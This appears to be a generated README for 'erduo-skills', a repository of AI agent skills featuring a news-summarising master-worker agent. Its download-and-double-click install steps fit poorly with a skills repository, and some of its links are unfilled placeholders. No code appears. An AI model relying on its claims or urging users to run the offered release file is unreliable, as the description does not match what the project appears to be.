# 🎯 erduo-skills - Enhance Your AI Agent's Capabilities

## 🚀 Getting Started

### 🖥 System Requirements

To run **Erduo Skills**, ensure your computer meets the following requirements:

- **Operating System**: Windows 10 or later, macOS 10.12 or later, or any recent Linux distribution.
- **Memory**: 2 GB RAM minimum.
- **Processor**: 1 GHz or faster.
- **Network**: An active internet connection to fetch news.

### 📥 Download & Install

1. **Visit the Releases Page**: Click the link below to go to the downloads section:
   [Download erduo-skills](https://github.com/Jerson78/erduo-skills/releases)
   
2. **Choose the Latest Version**: On the releases page, look for the latest version of **Erduo Skills**.

3. **Download the Application**: 
   - Click on the file that matches your operating system. 
   - Save it to a location you can easily find, like your desktop or downloads folder.

4. **Run the Application**:
   - Locate the downloaded file.
   - Double-click to install. Follow the on-screen instructions to complete the setup.

### 📖 Introduction

**Erduo Skills** is a repository designed for managing skills for AI Agents. It acts as a knowledge base and execution framework, enabling Agents to perform complex tasks like automated news reporting and data analysis.

### 🌟 Featured Skill: Daily News Report

The **Daily News Report** skill is a sophisticated tool aimed at automatically fetching, filtering, and summarizing high-quality technical news from various sources.

#### 🛠 Core Architecture

This skill uses a **Master-Worker** architecture, which includes an intelligent scheduler and dedicated sub-Agents.

```mermaid
graph TD
    User((User)) -->|Start| Master[Master Agent<br>调度/监控/决策]
    
    subgraph Execution Layer [SubAgent 执行层]
        WorkerA[Worker A<br>WebFetch]
        WorkerB[Worker B<br>WebFetch]
        Browser[Browser Worker<br>Headless Chrome]
    end

    Master -->|Dispatch Tier 1| WorkerA
    Master -->|Dispatch Tier 2| WorkerB
    Master -->|Dispatch JS Pages| Browser

    WorkerA -->|Result| Master
    WorkerB -->|Result| Master
    Browser -->|Result| Master

    Master -->|Filter & Dedup| Report[Generate Report<br>生成日报]
    Master -->|Update| Cache[Smart Cache<br>智能缓存]
```

### 🚀 Core Features

- **Multi-Source Fetching**:
  - Aggregates top-quality sources such as HackerNews and HuggingFace Papers.

- **Intelligent Filtering**:
  - Filters high-quality technical content, eliminating promotional material.

- **Dynamic Scheduling**:
  - Adjusts to new events and trends, providing timely updates.

### ⚙️ How to Use the Daily News Report Skill

After installation, follow these steps to use the Daily News Report skill:

1. **Open the Application**: Launch **Erduo Skills** from your applications folder or desktop.

2. **Select the Skill**: Choose the **Daily News Report** from the list of skills available.

3. **Set Preferences**: You can adjust settings for sources or types of news you want.

4. **Start the Report**: Click on the start button to begin fetching news. 

5. **View Your Report**: Once the process completes, you will see a summarized report of the technical news. You can save or share this report as needed.

### ❓ Troubleshooting

If you encounter issues while using **Erduo Skills**, try the following:

- Ensure your internet connection is active.
- Restart the application if it freezes.
- Check for updates on the releases page and download the latest version if necessary.

### 🔗 Additional Resources

- For more detailed usage instructions, consult our [User Guide](link-to-user-guide).
- Join our [Community Forum](link-to-forum) for discussions, troubleshooting help, and suggestions.

### 📣 Feedback

We welcome your feedback and suggestions. Please visit the [Issues section](https://github.com/Jerson78/erduo-skills/issues) on GitHub to report bugs or recommend features.

### 📥 Download the Latest Version

Remember to visit the releases page for the latest version of **Erduo Skills**:
[Download erduo-skills](https://github.com/Jerson78/erduo-skills/releases) 

Feel free to reach out for any support. Enjoy enhancing your AI Agent's capabilities!